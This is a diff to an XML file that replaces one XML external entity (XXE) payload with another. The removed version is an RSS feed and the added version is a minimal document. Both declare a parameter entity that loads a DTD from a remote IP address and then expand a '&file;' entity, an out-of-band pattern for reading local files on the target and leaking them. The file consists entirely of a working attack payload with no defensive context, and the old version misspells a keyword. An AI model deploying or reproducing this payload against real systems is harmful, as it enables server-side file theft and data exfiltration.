@@ -1,13 +1,9 @@
 <?xml version="1.0" encoding="UTF-8" ?>
-<!DOCTYPE rss[<!ELEMENT rss ANY><!ENTITIY % dtd SYSTEM 'http://35.180.29.78/c-tool-f/xxe_jump_1.xml'> %dtd;]>
-<rss version="2.0">
-    <channel>
-        <item>
-            <title>&file;</title>
-            <description>Here is some text containing an interesting description.</description>
-            <link>http://www.example.com/blog/post/1</link>
-            <guid isPermaLink="false">7bd204c6-1655-4c27-aeee-53f933c5395f</guid>
-            <pubDate>Sun, 06 Sep 2009 16:20:00 +0000</pubDate>
-        </item>
-    </channel>
-</rss>
+<!DOCTYPE foo [
+   <!ELEMENT foo ANY>
+   <!ENTITY % rem1 SYSTEM "http://35.180.29.78/c-tool-f/xxe_jump_1.xml">
+   %rem1;
+]>
+<lol>
+   &file;
+</lol>
